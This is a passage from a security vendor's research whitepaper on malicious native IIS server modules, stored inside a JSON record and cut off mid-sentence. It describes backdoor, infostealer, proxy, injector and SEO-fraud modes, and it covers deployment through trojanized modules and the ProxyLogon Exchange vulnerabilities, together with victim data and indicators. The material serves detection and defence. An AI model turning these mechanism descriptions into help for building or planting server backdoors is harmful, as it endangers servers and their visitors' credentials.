{
    "id": "0b8f472c-3cd8-420d-a8a9-56e32413e192",
    "created_at": "2022-10-25T16:48:20.683485Z",
    "updated_at": "2025-03-27T02:17:27.578279Z",
    "deleted_at": null,
    "sha1_hash": "173eaa8ad48973498624c0b4923cfafd3a3e5a41",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-07-29T10:13:28Z",
    "file_modification_date": "2021-07-29T11:40:55Z",
    "file_size": 4740625,
    "plain_text": "# ANATOMY OF NATIVE IIS MALWARE\n\n#### Authors: Zuzana Hromcová Anton Cherepanov\n\n\n-----\n\n## TABLE OF CONTENTS\n\n1 EXECUTIVE SUMMARY. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n\n2 INTRODUCTION. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n\n3 BACKGROUND INFORMATION. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\n\n3.1 IIS malware types . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\n\n3.2 Typical attack overview. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\n3.2.1 Initial vector. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\n3.2.2 Persistence and execution. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\n3.3 Victimology. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\n4 ANATOMY OF NATIVE IIS MALWARE. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\n\n4.1 Native IIS malware essentials. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\n\n4.1.1 Module class. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\n\n4.1.2 Request-processing pipeline . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n\n4.1.3 RegisterModule function. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\n\n4.2 Native IIS malware features. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\n\n4.2.1 Parsing HTTP requests. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17\n\n4.2.2 Classifying requests. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\n\n4.2.3 Processing HTTP requests. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n4.2.4 Modifying HTTP responses. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n\n4.3 Anti-analysis and detection evasion techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\n4.3.1 Obfuscation techniques. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\n4.3.2 C&C communication. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\n4.3.3 Anti-logging features. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\n\n4.4 Summary table. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30\n\n5 MITIGATION. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\n5.1 Preventing compromise of IIS servers. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\n5.2 Detecting compromised IIS servers. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\n5.3 Removing native IIS malware. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\n\n6 CONCLUSION . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\n\n7 ACKNOWLEDGEMENTS. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\n\n8 REFERENCES. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\n\n9 MITRE ATT&CK TECHNIQUES. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36\n\nAPPENDIX: ANALYSIS AND INDICATORS OF COMPROMISE (IOCS). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n\nGroup 1 (IIS-Raid derivatives). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n\nGroup 2. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40\n\nGroup 3. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43\n\nGroup 4 (RGDoor) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44\n\nGroup 5. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46\n\nGroup 6 (ISN). . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\n\nGroup 7 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48\n\nGroup 8. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52\n\nGroup 9. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 54\n\n\n-----\n\nGroup 10. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 58\n\nGroup 11. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60\n\nGroup 12. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 63\n\nGroup 13. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65\n\nGroup 14 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 67\n\n\n-----\n\n## LIST OF FIGURES\n\nFigure 1 _Shodan result for public servers with OWA running Microsoft Exchange 2013 or 2016 .  .  .  .  .  .  .  .  .  .  .  .  . 7_\n\nFigure 2 _Overview of IIS malware mechanisms .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 8_\n\nFigure 3 _Victims of native IIS modules spread via the ProxyLogon vulnerability chain . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 10_\n\nFigure 4 _Module class methods of CHttpModule class (left) and CGlobalModule class (right) .  .  .  .  .  .  .  .  .  . 12_\n\nFigure 5 _Default event handler method CHttpModule::OnSendResponse .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  13_\n\nFigure 6 _Group 7 (left) and Group 12 (right) event handler methods .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  13_\n\nFigure 7 _HTTP request-processing pipeline in IIS .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  14_\n\nFigure 8 _A typical RegisterModule function of a native IIS module .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  15_\n\nFigure 9 `RegisterModule function example (Group 7) .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  16`\n\nFigure 10 _A more complex RegisterModule function with initialization functions (Group 9) .  .  .  .  .  .  .  .  .  .  .  .  16_\n\nFigure 11 _Typical native IIS malware phases . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  17_\n\nFigure 12 _Reading HTTP request body (Group 2) .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  17_\n\nFigure 13 _Group 11 obtains values of HTTP request headers by querying IIS server variables . .  .  .  .  .  .  .  .  .  .  .  .  .  . 18_\n\nFigure 14 _Attacker requests for Group 7 have a specific relationship between the request URL,_\n```\n      Host and Cookie headers .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  19\n\n```\nFigure 15 _Group 7 backdoor attacker request format .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 19_\n\nFigure 16 _Group 5 infostealing mechanism .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 20_\n\nFigure 17 _C&C communication leveraging a compromised IIS server as a proxy . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 22_\n\nFigure 18 _Strings used to deceive search engine crawlers (Group 10) .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 24_\n\nFigure 19 _Group 12 processes HTTP requests based on keywords in URIs or Referer headers .  .  .  .  .  .  .  .  .  .  .  .  25_\n\nFigure 20 _Replacing HTTP response with own data (Group 8) .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 26_\n\nFigure 21 _Group 9 deletes the Accept-Encoding header from the request to prevent other modules_\n_from using compression in the HTTP response . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 26_\n\nFigure 22 _Group 5 VERSIONINFO resource (left) mimics legitimate dirlist.dll module (right) .  .  .  .  .  .  .  .  .  . 27_\n\nFigure 23 _Group 11 uses DNS records to obtain its configuration .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  28_\n\nFigure 24 _Group 7 modifies log entries for attacker requests . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 29_\n\nFigure 25 _Log folder location can be found in Internet Information Services Manager .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  32_\n\nFigure 26 _Removing a native IIS module using IIS Manager .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  33_\n\nFigure 27 _Removing a native IIS module using AppCmd.exe tool .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  33_\n\nFigure 28 _The RGDoor backdoor accepts any HTTP verb with its malicious requests .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  45_\n\nFigure 29 _RGDoor registers its OnBeginRequest handler via SetRequestNotifications .  .  .  .  .  .  .  .  .  .  . 46_\n\nFigure 30 _Disabling notifications for the BeginRequest event .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 55_\n\nFigure 31 _Group 11 malware uses information from its C&C server to modify HTTP responses for inbound requests . 61_\n\n\n-----\n\n## LIST OF TABLES\n\nTable 1 _IIS malware families studied in this paper . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 8_\n\nTable 2 _Group 7 attacker HTTP request body structure .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  21_\n\nTable 3 _Group 7 backdoor commands .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  22_\n\nTable 4 _Summary of obfuscations implemented, and functionalities supported by analyzed IIS malware families . . 30_\n\nTable 5 _Backdoor commands for Group 1 (not all commands are supported by all samples) .  .  .  .  .  .  .  .  .  .  .  .  .  . 39_\n\nTable 6 _Group 2 backdoor commands .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  41_\n\nTable 7 _Group 2 backdoor commands (older version) . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 42_\n\nTable 8 _Group 7 backdoor commands .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 50_\n\nTable 9 _Group 7 backdoor commands .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 51_\n\nTable 10 _Group 8 backdoor commands .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  53_\n\nTable 11 _Group 12 backdoor commands .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 64_\n\nTable 12 _Configuration fields used by Group 13 . .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 66_\n\n\n-----\n\n## 1 EXECUTIVE SUMMARY\n\n[Internet Information Services (IIS) is Microsoft web server software for Windows with an extensible,](https://www.iis.net/)\n\nmodular architecture. It is not unknown for threat actors to misuse this extensibility to intercept or\n\nmodify network traffic – the first known case of IIS malware targeting payment information from\n\ne-commerce sites was reported in 2013.\n\nFast-forward to March 2021, and IIS backdoors are being deployed via the recent Microsoft Exchange\n\n[pre-authentication RCE vulnerability chain (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855)\n\n_[2021-27065), with government institutions among the targets. As Outlook on the web is implemented via](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27065)_\n\nIIS, Exchange email servers are particularly interesting targets for IIS malware.\n\nIIS malware should be in the threat model, especially for servers with no security products. Despite\n\nthis, no comprehensive guide has been published on the topic of the detection, analysis, mitigation, and\n\nremediation of IIS malware.\n\nIn this paper, we fill that gap by systematically documenting the current landscape of IIS malware,\n\nfocusing on native IIS modules (implemented as C++ libraries). Based on our analysis of 14 malware\n\nfamilies – 10 of them newly documented – we break down the anatomy of native IIS malware,\n\nextract its common features and document real-world cases, supported by our full-internet scan for\n\ncompromised servers.\n\nWe don’t focus on any single threat actor, malware family or campaign, but rather on the whole class of\n\nIIS threats – ranging from traffic redirectors to backdoors. We cover curious schemes to boost third\nparty SEO by misusing compromised servers, and IIS proxies turning the servers into a part of C&C\n\ninfrastructure.\n\nFinally, we share practical steps for the defenders to identify and remediate a successful compromise.\n\n## 2 INTRODUCTION\n\nIIS is Microsoft web server software for Windows. Since IIS v7.0 (first shipped with Windows Vista\n\nand Windows Server 2008), the software has had a modular architecture – both native (C++ DLL)\n\n[and managed (.NET assembly) modules can be used to replace or extend core IIS functionality [1]. For](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview)\n\nexample, developers can use IIS modules to modify how requests are handled or perform special logging\n\nor traffic analysis.\n\nIt comes as no surprise that the same extensibility is attractive for malicious actors – to intercept\n\nnetwork traffic, steal sensitive data or serve malicious content. Web server software has been targeted\n\n[by malware in the past (such as Darkleech [2], a malicious Apache module), and IIS software is no](https://www.welivesecurity.com/2012/12/18/malicious-apache-module-used-for-content-injection-linuxchapro-a/)\n\nexception.\n\nThere have already been a few individual reports of malicious IIS modules, used for cybercrime and\n\ncyberespionage alike:\n\n- [2013 – ISN infostealer reported by Trustwave [3], a native module](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)\n\n- [2018 – RGDoor backdoor reported by Palo Alto Networks [4], a native module](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/)\n\n- [2019 – incident response report by Secpulse [5], native modules](https://www.secpulse.com/archives/113500.html)\n\n- [2020 – infostealer reported by TeamT5 [6], a managed module](https://teamt5.org/tw/posts/e-commerce-security-a-case-study-on-credit-card-data-breaches/)\n\n- [2021 – IIS-Raid backdoor deployed via an Exchange server vulnerability, reported by ESET [7], a](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)\n\nnative module\n\nHowever, the existing reports on IIS threats are limited in scope, with the knowledge fragmented and\n\ntechnical details often missing or inaccurate. No comprehensive guide has been published on the topic.\n\n\n-----\n\nIn this paper, we take a step back and look at this class of threats – both known and newly reported. To\n\nlimit the scope of this research, we focus on malicious native modules – malicious C++ libraries, installed\n\non the IIS server as its modules.\n\nWe don’t cover managed modules, nor other malware that is able to run on IIS servers but not designed\n\nas IIS server modules (such as scripts). Unless explicitly stated otherwise, when the terms IIS modules or\n\n_modules are used in this paper, we are always referring to native IIS modules._\n\nWe analyze 14 individual malware families (including 10 newly documented), obtained from our\n\ntelemetry or from VirusTotal. ESET security solutions detect these families as Win{32,64}/BadIIS and\n\nWin{32,64}/Spy.IISniff.\n\nIn Section 3 of this paper, we document common IIS malware features, attack scenarios, prevalence, and\n\ntargets, based on the analysis and results of internet scans we ran to complement our telemetry and\n\nidentify additional victims.\n\nIn Section 4, we provide the essentials for reverse-engineering native IIS malware. We dissect the\n\nanatomy of malicious native IIS modules and examine how their features can be implemented. We\n\nuse examples taken from various malware families across the paper to illustrate the techniques and\n\nfunctionality and show notable cases.\n\nFull analyses of all the IIS malware families we have studied are provided in the Appendix of this paper,\n\nas reference material.\n\n## 3 BACKGROUND INFORMATION\n\nIn the course of our research, we collected 80+ unique native IIS malware samples and clustered them\n\ninto 14 malware families. Throughout the paper, we refer to these families as Group 1 to Group 14.\n\nExcept for the previously reported families ISN, RGDoor and IIS-Raid, the families are relatively new –\n\nwith first-detected activity ranging between 2018 and 2021. Many of these families have been under\n\nactive development throughout 2021, continuing as of this writing, but are not related to each other.\n\nThey are individual malware families with one key feature – that they are developed as malicious native\n\nIIS modules.\n\nWe don’t focus on attribution in this paper, and our grouping to 14 malware families doesn’t necessarily\n\ndirectly correspond to 14 distinct threat actors. For example, while the features of Groups 8–12 vary,\n\ncode overlaps suggest a common developer behind these families. On the other hand, several threat\n\nactors have been using an IIS backdoor derived from the same publicly available code, and we refer to all\n\nof these cases collectively as Group 1.\n\n### 3.1 IIS malware types\n\nBeing a part of the server allows the cybercriminals to intercept traffic and bypass SSL/TLS – even if the\n\ncommunication channel is encrypted, the attackers have full access to data processed by the server,\n\nsuch as credentials and payment information processed by e-commerce sites.\n\nFurthermore, our research shows that IIS modules are used to serve malicious content, manipulate\n\nsearch engine algorithms, or to turn benign servers into malicious proxies, which are then used in other\n\nmalware campaigns to conceal C&C infrastructure.\n\n\n-----\n\nFinally, while IIS is not the most widely used[1] web server software, it is used to implement Outlook on\n\nthe web (aka OWA[2] ) for Microsoft Exchange email servers, which also makes it a particularly interesting\n\ntarget for espionage.\n\nWe queried the Shodan service for servers with the IIS banner X-AspNet-Version and Outlook in the\n\ntitle to estimate a number of such servers – as shown in Figure 1, the number of public-facing servers\n\nwith OWA running Microsoft Exchange 2013 or 2016 is over 200,000.\n\nFigure 1 // Shodan result for public servers with OWA running Microsoft Exchange 2013 or 2016\n\nIn all cases, the main purpose of IIS malware is to process HTTP requests incoming to the\n\ncompromised server and affect how the server responds to (some of) these requests – how they are\n\nprocessed depends on malware type.\n\nWe identified five main modes in which IIS malware operates:\n\n- _Backdoor mode allows the attackers to remotely control the compromised computer with IIS installed_\n\n- _Infostealer mode allows the attackers to intercept regular traffic between the compromised server and_\n\nits legitimate visitors, to steal information such as login credentials and payment information\n\n- _Injector mode where IIS malware modifies HTTP responses sent to legitimate visitors to serve malicious_\n\ncontent\n\n- _Proxy mode turns the compromised server into an unwitting part of C&C infrastructure for another_\n\nmalware family, and misuses the IIS server to relay communication between victims and the real C&C\n\nserver\n\n- _SEO fraud mode where IIS malware modifies the content served to search engines to manipulate SERP_\n\nalgorithms and boost ranking for selected websites\n\nThese mechanisms are illustrated in Figure 2 and described in detail later in this paper.\n\n1 According to the latest Netcraft web server survey [8] and W3Techs survey statistics [9], as of this writing, IIS has market share of 4-7%\nof websites.\n2 Previously known as Outlook Web Access, thus the OWA acronym.\n\n\n-----\n\nFigure 2 // Overview of IIS malware mechanisms\n\nOf the 14 malware families examined, several combine two, three, or more of these mechanisms, as listed\n\nin Table 1. The design of IIS modules allows them to handle various HTTP requests differently to support\n\nseveral modes – for example, requests from legitimate users can be handled in infostealer mode while\n\nattacker requests are handled in backdoor mode.\n\nTable 1 // IIS malware families studied in this paper\n\n**Malware family** **Supported modes**\n\nGroup 1 (IIS-Raid) Backdoor and infostealer\n\nGroup 2 Backdoor\n\nGroup 3 Backdoor\n\nGroup 4 (RGDoor) Backdoor\n\nGroup 5 Infostealer\n\nGroup 6 (ISN) Infostealer\n\nGroup 7 Backdoor\n\nGroup 8 Backdoor\n\nGroup 9 Proxy and SEO fraud\n\nGroup 10 SEO fraud\n\nGroup 11 Backdoor, proxy, SEO fraud and injector\n\nGroup 12 Backdoor, proxy, SEO fraud and injector\n\nGroup 13 Backdoor and SEO fraud\n\nGroup 14 SEO fraud and injector\n\n\n-----\n\n### 3.2 Typical attack overview\n\n#### 3.2.1 Initial vector\n\nThe raw data we had for this research was mostly malware samples only, often missing contextual\n\ninformation. Thus, it is difficult to determine the initial access vector used to install these malicious\n\nmodules into IIS servers.\n\nHowever, we know that administrative rights are required to install a native IIS module, as they have\n\n[unrestricted access to any resource available to the server worker process [1]. This narrows down the](https://docs.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview)\n\noptions for the initial attack vector.\n\nWe have seen evidence for two scenarios.\n\nTrojanized modules\n\nThe first observed initial access technique is through trojanized IIS modules. In this scenario, the IIS\n\nserver administrator unwittingly installs a trojanized version of a legitimate IIS module, perhaps one\n\ndownloaded from unofficial sources. For example, Group 12 includes a trojanized version of a legitimate\n\nnative module called F5 X-Forwarded-For, that converts the X-Forwarded-For HTTP header so that it’s\n\nvisible as the client IP address in the IIS logs.\n\nServer exploitation\n\nAnother option is an attacker who is able to get access to the server via some configuration weakness\n\nor vulnerability in a web application or the server, and then installs the malicious IIS module on the\n\nserver once such access is gained.\n\nAccording to our telemetry, Group 7 samples are used in connection with Juicy Potato (detected\n\nas Win64/HackTool.JuicyPotato by ESET security solutions), which is a privilege escalation tool.\n\nFurthermore, in March 2021 we detected several variants of Group 1 samples (based on an open-source\n\nIIS backdoor and used by various actors) deployed on vulnerable Microsoft Exchange servers via the\n\nProxyLogon vulnerability chain (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021\n27065).\n\n#### 3.2.2 Persistence and execution\n\nOnce installed, a native IIS module is loaded by all worker processes on the server. IIS Worker Process\n\n(w3wp.exe) handles the requests sent to the IIS web server; thus an IIS module is able to affect the\n\n[processing of every request [10].](https://www.microsoftpressstore.com/articles/article.aspx?p=2231761)\n\nIIS itself is persistent – with the default installation, its services (such as World Wide Web Publishing\n\n_Service, Windows Process Activation Service or Application Host Helper Services) are configured to run_\n\nautomatically at each system start. This means there is no need for native IIS malware to implement\n\nadditional persistence mechanisms.\n\n### 3.3 Victimology\n\nAccording to our telemetry, only a small number of servers were targeted by the studied malware\n\nfamilies, but this is likely affected by our limited visibility into IIS servers – it is still common for\n\nadministrators not to use any security software on servers.\n\nTo complement our telemetry, we therefore performed internet-wide scans for selected families to\n\nidentify other potential victims.\n\n\n-----\n\nIt is important to note that victims of IIS malware are not limited to compromised servers – all\n\nlegitimate visitors of the websites hosted by these servers are potential targets, as the malware can be\n\nused to steal sensitive data from the visitors or serve malicious content.\n\nWe will not list all the targets exhaustively in this section - for information about the targets of the\n\nrespective IIS malware families, please refer to the Appendix of this paper. Instead, we will focus on\n\nthe most notable case – Group 1 – which is a collection of malware samples derived from a publicly\n\navailable backdoor called IIS-Raid. In its original form, the backdoor supports simple features such as\n\ndownloading and uploading files, and running shell commands, which can be activated when attackers\n\nsend an HTTP request including custom headers with a password. This malware has been customized by\n\nvarious threat actors – we have found 11 header and password combinations.\n\nIn March 2021, we detected a wave of IIS-Raid variants in the wild, after the Microsoft Exchange pre\nauthentication RCE vulnerability chain (CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE\n[2021-27065), aka ProxyLogon [11], was disclosed. Several threat actors have used this vulnerability chain](https://proxylogon.com/)\n\nto, inter alia, deploy IIS malware on Exchange servers that have OWA support that relies on IIS. We have\n\nalready reported one variant[3] of IIS-Raid in ESET’s blogpost about how this vulnerability is being used by\n\n[various threat actors to compromise Microsoft Exchange servers around the world [7].](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)\n\nSince then, we have detected three more variants of IIS-Raid, and an additional variant of the Group 3\n\nbackdoor, all spreading through the vulnerability to Microsoft Exchange servers.\n\nOne of these samples was named deceptively Microsoft.Exchange.Clients.OwaAuth.dll, another\n\nhad the following PDB path embedded:\n```\n   C:\\ProxyLogon-CVE-2021-26855-main\\IIS-Raid-modify\\module\\x64\\Release\\IIS   Backdoor.pdb\n\n```\nFigure 3 shows the geographical locations of servers affected by these five campaigns, using the data\n\nfrom our telemetry and internet-wide scans.\n\nFigure 3 // Victims of native IIS modules spread via the ProxyLogon vulnerability chain\n\n3 SHA-1: AA9BA493CB9E9FA6F9599C513EDBCBEE84ECECD6\n\n\n-----\n\nThe following entities were among the victims:\n\n- Government institutions in three countries in Southeast Asia\n\n- A major telecommunications company in Cambodia\n\n- A research institution in Vietnam\n\n- Dozens of private companies in a range of industries, located mostly in Canada, Vietnam and India,\n\nand others in the USA, New Zealand, South Korea, and other countries\n\nWe notified all these victims about the compromises.\n\nWe didn’t find any pattern among the targeted servers, and it is possible that these attackers used the\n\nvulnerability to compromise as many servers as possible, without any targeting. In at least one case[4], the\n\nattackers used the malware to spread the Lemon Duck cryptominer. This finding was already reported\n\n[by Sophos [12] in May 2021, and we independently confirmed it using data from the compromised 